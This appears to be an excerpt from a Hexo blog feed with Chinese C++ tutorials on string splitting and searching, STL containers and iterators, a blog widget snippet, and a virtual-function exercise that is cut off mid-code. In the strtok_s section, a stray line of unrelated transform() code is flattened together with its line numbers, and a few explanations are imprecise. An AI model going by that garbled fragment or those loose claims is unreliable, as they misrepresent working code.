        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考：<a href="https://www.jianshu.com/p/e9924ba9b18c">strtok_s 函数说明</a></p><p>C++没有python那样的split分割函数，但string.h和string类提供了下列函数方便我们处理字符串</p><h2 id="函数与用例"><a href="#函数与用例" class="headerlink" title="函数与用例"></a>函数与用例</h2><h3 id="1-strtok-s"><a href="#1-strtok-s" class="headerlink" title="1. strtok_s"></a>1. strtok_s</h3><p><strong>应用</strong>：将字符串按照给定字符进行分割</p><p><strong>参数</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">strtok_s</span><span class="params">(<span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>* delimiters, <span class="type">char</span>** next_token)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一个参数是待分割的字符串</span></span><br><span class="line"><span class="comment">第二个参数是指定作为分界线的字符</span></span><br><span class="line"><span class="comment">第三个参数是分割剩余的子字符串的存储位置</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>xxxxxxxxxx24 1string str = “dqywy”;2cout &lt;&lt; “转换前：” &lt;&lt; str &lt;&lt; endl;3transform(str.begin(), str.end(), str.begin(), toupper);4cout &lt;&lt; “转换后：” &lt;&lt; str &lt;&lt; endl;5​6// 也可以定义一个新的字符串来接收，修改目标容器起始地址即可，但是字符串长度应该一致7string str = “dqywy”;8string temp = “dqywy99”;9cout &lt;&lt; “转换前：” &lt;&lt; str &lt;&lt; endl;10transform(str.begin(), str.end(), temp.begin(), toupper);11cout &lt;&lt; “转换后：” &lt;&lt; temp &lt;&lt; endl;12​13// 测试返回值14// 过程分析：15// 1. 目标容器temp中的dqywy被修改为DQYWY，99未被覆盖，保持不变16// 2. transform返回temp存储DQYWY后的下一个位置的迭代器，即字符9的指针17string str = “dqywy”;18string temp = “dqywy99”;19string::iterator p; // 字符串迭代器20cout &lt;&lt; “转换前：” &lt;&lt; str &lt;&lt; endl;21p = transform(str.begin(), str.end(), temp.begin(), toupper);22cout &lt;&lt; “转换后：” &lt;&lt; temp &lt;&lt; endl;23cout &lt;&lt; “transform返回值解引用：” &lt;&lt; *p &lt;&lt; endl;24return 0;c++</p><p><strong>注意</strong>：第二个参数是const char<em>类型，不要忘记加<strong>const</strong>；第三个参数是二级指针，不要忘记对一级指针<em>*取地址</em></em>&amp;</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;https-dqywy-top&quot;</span>;<span class="comment">// 待分割的字符串</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> delim[] = <span class="string">&quot;-&quot;</span>;<span class="comment">// 分割符</span></span><br><span class="line">    <span class="type">char</span>* token;<span class="comment">// 存储返回的子字符串</span></span><br><span class="line"><span class="type">char</span> *next_token = <span class="literal">NULL</span>;<span class="comment">// 存储未处理的子字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个子字符串</span></span><br><span class="line">token = <span class="built_in">strtok_s</span>(str, delim, &amp;next_token);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取其余子字符串</span></span><br><span class="line"><span class="keyword">while</span> (token != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; token &lt;&lt; endl;<span class="comment">// 注意打印应该传token而不是*token，*token是字符，token是字符串的首地址</span></span><br><span class="line">token = <span class="built_in">strtok_s</span>(next_token, delim, &amp;next_token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-find"><a href="#2-find" class="headerlink" title="2. find"></a>2. find</h3><p><strong>应用</strong>：查找指定子字符串的是否存在及具体位置</p><p><strong>参数</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">find</span><span class="params">(<span class="type">const</span> string&amp; str, <span class="type">size_t</span> pos = <span class="number">0</span>)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一个参数是待查找的子字符串</span></span><br><span class="line"><span class="comment">第二个参数是开始匹配的位置</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：匹配成功返回子字符串的第一个字符在整个字符串的下标；匹配失败返回string::npos (即-1)</p><p><strong>注意</strong>：匹配失败返回的string::npos实质上就是-1</p><p><strong>实例</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string str = <span class="string">&quot;https-dqywy-top&quot;</span>;</span><br><span class="line"><span class="type">int</span> pos = <span class="number">0</span>;<span class="comment">// 起始查找位置</span></span><br><span class="line">    string goal = <span class="string">&quot;dqywy&quot;</span>;<span class="comment">// 目标字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((pos = str.<span class="built_in">find</span>(goal, <span class="number">0</span>)) != string::npos)<span class="comment">// 即子字符串存在</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;字符串&#x27;dqywy&#x27;第一次出现的位置为：&quot;</span> &lt;&lt; pos &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;字符串不存在！&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span>;<span class="comment">// 重置起始查找位置</span></span><br><span class="line">    goal = <span class="string">&quot;ljywz&quot;</span>;<span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> ((pos = str.<span class="built_in">find</span>(goal, <span class="number">0</span>)) != string::npos)<span class="comment">// 即子字符串存在</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;字符串&#x27;ljywz&#x27;第一次出现的位置为：&quot;</span> &lt;&lt; pos &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;字符串不存在！&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-substr"><a href="#3-substr" class="headerlink" title="3. substr"></a>3. substr</h3><p><strong>应用</strong>：获取从指定的起始位置开始，长度为n的子字符串</p><p><strong>参数</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">substr</span><span class="params">(<span class="type">size_t</span> pos = <span class="number">0</span>, <span class="type">size_t</span> n = npos)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一个参数是起始位置</span></span><br><span class="line"><span class="comment">第二个参数是截取的子字符串的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：子字符串</p><p><strong>注意</strong>：起始位置从0开始计算</p><p><strong>实例</strong>: </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string str = <span class="string">&quot;https-dqywy-top&quot;</span>;</span><br><span class="line">string sub_str;<span class="comment">// 截取字符串</span></span><br><span class="line">sub_str = str.<span class="built_in">substr</span>(<span class="number">6</span>, <span class="number">5</span>);</span><br><span class="line">cout &lt;&lt; sub_str &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++容器种类及常用函数</title>
      <link href="/post/19b597f8.html"/>
      <url>/post/19b597f8.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://blog.csdn.net/tju_fengbo/article/details/81978595"> C++中的容器类详解</a></p><h2 id="容器种类"><a href="#容器种类" class="headerlink" title="容器种类"></a>容器种类</h2><div class="table-container"><table><thead><tr><th>标准容器类</th><th>说明</th></tr></thead><tbody><tr><td>顺序性容器</td><td></td></tr><tr><td>vector</td><td>从后面快速的插入与删除，直接访问任何元素</td></tr><tr><td>deque</td><td>从前面或后面快速的插入与删除，直接访问任何元素</td></tr><tr><td>list</td><td>双链表，从任何地方快速插入与删除</td></tr><tr><td></td><td></td></tr><tr><td>关联容器</td><td></td></tr><tr><td>set</td><td>快速查找，不允许重复值</td></tr><tr><td>multiset</td><td>快速查找，允许重复值</td></tr><tr><td>map</td><td>一对多映射，基于关键字快速查找，不允许重复值</td></tr><tr><td>multimap</td><td>一对多映射，基于关键字快速查找，允许重复值</td></tr><tr><td></td><td></td></tr><tr><td>容器适配器</td><td>虽然stack和queue中也可以存放元素，但在STL中并没有将其划分在容器的行列，而是将其称为容器适配器，这是因为stack和queue只是对其他容器的接口进行了包装，STL中stack和queue默认使用<a href="https://so.csdn.net/so/search?q=deque&amp;spm=1001.2101.3001.7020">deque</a>（双端队列）</td></tr><tr><td>stack</td><td>后进先出</td></tr><tr><td>queue</td><td>先进先出</td></tr><tr><td>priority_queue</td><td>最高优先级元素总是第一个出列，优先级队列默认使用vector作为其底层存储数据的容器，在vector上又使用了堆算法将vector中元素构造成堆的结构，因此priority_queue就是堆</td></tr></tbody></table></div><h2 id="标准库共有函数"><a href="#标准库共有函数" class="headerlink" title="标准库共有函数"></a>标准库共有函数</h2><div class="table-container"><table><thead><tr><th>默认构造函数</th><th>提供容器默认初始化的构造函数。</th></tr></thead><tbody><tr><td>复制构造函数</td><td>将容器初始化为现有同类容器副本的构造函数</td></tr><tr><td>析构函数</td><td>不再需要容器时进行内存整理的析构函数</td></tr><tr><td>empty</td><td>容器中没有元素时返回true,否则返回false</td></tr><tr><td>max_size</td><td>返回容器中最大元素个数</td></tr><tr><td>size</td><td>返回容器中当前元素个数</td></tr><tr><td>=</td><td>将一个容器赋给另一个容器</td></tr><tr><td>&lt;</td><td>如果第一个容器小于第二个容器，返回true，否则返回false，</td></tr><tr><td>&lt;=</td><td>如果第一个容器小于或等于第二个容器，返回true，否则返回false</td></tr><tr><td>&gt;</td><td>如果第一个容器大于第二个容器，返回true，否则返回false</td></tr><tr><td>&gt;=</td><td>如果第一个容器大于或等于第二个容器，返回true，否则返回false</td></tr><tr><td>==</td><td>如果第一个容器等于第二个容器，返回true，否则返回false</td></tr><tr><td>!=</td><td>如果第一个容器不等于第二个容器，返回true，否则返回false</td></tr><tr><td>swap</td><td>交换两个容器的元素</td></tr></tbody></table></div><p>其中&gt;，&gt;=，&lt;，&lt;=，==，!=均不适用于priority_queue</p><h2 id="顺序容器和关联容器共有函数"><a href="#顺序容器和关联容器共有函数" class="headerlink" title="顺序容器和关联容器共有函数"></a>顺序容器和关联容器共有函数</h2><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>begin</td><td>该函数两个版本返回iterator或const_iterator，引用容器第一个元素</td></tr><tr><td>end</td><td>该函数两个版本返回iterator或const_iterator,引用容器<strong>最后一个元素后面一位</strong></td></tr><tr><td>rbegin</td><td>该函数两个版本返回reverse_iterator或const_reverse_iterator，引用容器最后一个元素</td></tr><tr><td>rend</td><td>该函数两个版本返回reverse_iterator或const_reverse_iterator，引用容器<strong>第一个元素前面一位</strong></td></tr><tr><td>erase</td><td>从容器中清除一个或几个元素</td></tr><tr><td>clear</td><td>清除容器中<strong>所有元素</strong></td></tr></tbody></table></div><h2 id="序列类容器使用区别"><a href="#序列类容器使用区别" class="headerlink" title="序列类容器使用区别"></a>序列类容器使用区别</h2><p>   1）如果你需要高效的随存随取，而不在乎插入和删除的效率，使用vector</p><p>   2）如果你需要<strong>大量</strong>的插入和删除，而不关心随机存取，则应使用list</p><p>   3）如果你需要随机存取，而且关心<strong>两端</strong>数据的插入和删除，则应使用deque</p>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++迭代器基础用法</title>
      <link href="/post/6e85eca8.html"/>
      <url>/post/6e85eca8.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="http://c.biancheng.net/view/338.html">C++迭代器（STL迭代器）iterator详解 (biancheng.net)</a></p><h2 id="迭代器种类"><a href="#迭代器种类" class="headerlink" title="迭代器种类"></a>迭代器种类</h2><ol><li><p>正向迭代器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">容器类名::iterator  迭代器名;</span><br></pre></td></tr></table></figure></li><li><p>常量正向迭代器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">容器类名::const_iterator 迭代器名;</span><br></pre></td></tr></table></figure></li><li><p>反向迭代器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">容器类名::reverse_iterator 迭代器名;</span><br></pre></td></tr></table></figure></li><li><p>常量反向迭代器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">容器类名::const_reverse_iterator 迭代器名;</span><br></pre></td></tr></table></figure></li></ol><h2 id="迭代器使用"><a href="#迭代器使用" class="headerlink" title="迭代器使用"></a>迭代器使用</h2><p>迭代器类似于指针，可以指向容器中的不同元素并进行修改(常量迭代器无法修改)，<code>*迭代器</code>就代表元素本身</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vector&lt;string&gt; flowers = &#123;<span class="string">&quot;LJY&quot;</span>, <span class="string">&quot;WY&quot;</span>, <span class="string">&quot;WZ&quot;</span>, <span class="string">&quot;DQY&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义正向迭代器</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;正向迭代器: &quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;修改前: &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (vector&lt;string&gt;::iterator iter = flowers.<span class="built_in">begin</span>(); iter != flowers.<span class="built_in">end</span>(); ++iter)<span class="comment">// 使用前置++效率更高</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line"><span class="built_in">transform</span>((*iter).<span class="built_in">begin</span>(), (*iter).<span class="built_in">end</span>(), (*iter).<span class="built_in">begin</span>(), tolower);<span class="comment">// 利用迭代器修改元素</span></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;修改后: &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (vector&lt;string&gt;::iterator iter = flowers.<span class="built_in">begin</span>(); iter != flowers.<span class="built_in">end</span>(); ++iter)<span class="comment">// 使用前置++效率更高</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义反向迭代器</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\n反向迭代器: &quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (vector&lt;string&gt;::reverse_iterator iter = flowers.<span class="built_in">rbegin</span>(); iter != flowers.<span class="built_in">rend</span>(); iter++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/05/12/p9yf4MV.png" alt=""></p><h3 id="功能分类"><a href="#功能分类" class="headerlink" title="功能分类"></a>功能分类</h3><p>1) 正向迭代器，支持以下操作：++p，p++，*p。此外，两个正向迭代器可以互相赋值，还可以用<code>==</code>和<code>!=</code>运算符进行比较。</p><p>2) 双向迭代器，具有正向迭代器的全部功能。除此之外，若 p 是一个双向迭代器，则<code>--p</code>和<code>p--</code>都是使得 p 朝和<code>++p</code>相反的方向移动。</p><p>3) 随机访问迭代器。具有双向迭代器的全部功能。若 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作：</p><ul><li>p+=i：使得 p 往后移动 i 个元素。</li><li>p-=i：使得 p 往前移动 i 个元素。</li><li>p+i：返回 p 后面第 i 个元素的迭代器。</li><li>p-i：返回 p 前面第 i 个元素的迭代器。</li><li><strong>p[i]：返回 p 后面第 i 个元素的引用。</strong></li></ul><p>此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;=、&gt;= 运算符进行比较。<code>p1&lt;p2</code>的含义是：p1 经过若干次（至少一次）<code>++</code>操作后，就会等于 p2。其他比较方式的含义与此类似</p><p>对于两个随机访问迭代器 p1、p2，表达式<code>p2-p1</code>也是有定义的，其返回值是 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数<strong>加一</strong>）</p><h3 id="不同容器的迭代器的功能"><a href="#不同容器的迭代器的功能" class="headerlink" title="不同容器的迭代器的功能"></a>不同容器的迭代器的功能</h3><div class="table-container"><table><thead><tr><th>容器或容器适配器</th><th>迭代器功能</th></tr></thead><tbody><tr><td>vector</td><td>随机访问</td></tr><tr><td>deque</td><td>随机访问</td></tr><tr><td>list</td><td>双向</td></tr><tr><td>set / multiset</td><td>双向</td></tr><tr><td>map / multimap</td><td>双向</td></tr><tr><td>stack</td><td>不支持迭代器</td></tr><tr><td>queue</td><td>不支持迭代器</td></tr><tr><td>priority_queue</td><td>不支持迭代器</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++迭代器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公告栏3D小人</title>
      <link href="/post/850eec50.html"/>
      <url>/post/850eec50.html</url>
      
        <content type="html"><![CDATA[<details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/06/03/pC91phq.png" alt=""></p>              </div>            </details><p>在 <code>Blog/themes/Butterfly/layout/includes/widget/card_announcement.pug</code> 下添加如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> .xpand(style=&#x27;height:200px;&#x27;)</span><br><span class="line">  canvas.illo(width=&#x27;800&#x27; height=&#x27;800&#x27; style=&#x27;max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;&#x27;)</span><br><span class="line">script(src=&#x27;https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js&#x27;)</span><br><span class="line">script(src=&#x27;https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js&#x27;)</span><br><span class="line">script#rendered-js(src=&#x27;https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js&#x27;)</span><br><span class="line">style.</span><br><span class="line">  .card-widget.card-announcement &#123;</span><br><span class="line">  margin: 0;</span><br><span class="line">  align-items: center;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  text-align: center;</span><br><span class="line">  &#125;</span><br><span class="line">  canvas &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  cursor: move;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>缩进参考：</p><p><img src="https://s1.ax1x.com/2023/04/27/p9Mvr9J.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚函数实例分析</title>
      <link href="/post/f61f36df.html"/>
      <url>/post/f61f36df.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天c++实验让我们分析下列程序的输出</p><h2 id="代码与运行结果"><a href="#代码与运行结果" class="headerlink" title="代码与运行结果"></a>代码与运行结果</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span>   <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span>   <span class="string">&lt;complex&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>   std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Base</span>() &#123; cout &lt;&lt; <span class="string">&quot;Base-ctor&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    ~<span class="built_in">Base</span>() &#123; cout &lt;&lt; <span class="string">&quot;Base-dtor&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span>)</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;Base::f(int)&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">double</span>)</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;Base::f(double)&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">g</span><span class="params">(<span class="type">int</span> i = <span class="number">10</span>)</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;Base::g()&quot;</span> &lt;&lt; i &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Derived</span>() &#123; cout &lt;&lt; <span class="string">&quot;Derived-ctor&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    ~<span class="built_in">Derived</span>() &#123; cout &lt;&lt; <span class="string">&quot;Derived-dtor&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(complex&lt;<span class="type">double</span>&gt;)</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Derived::f(complex)&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(<span class="type">int</span> i = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Derived::g()&quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(Base) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(Derived) &lt;&lt; endl;</span><br><span class="line">    Base b; <span class="comment">// Base-ctor</span></span><br><span class="line">    Derived 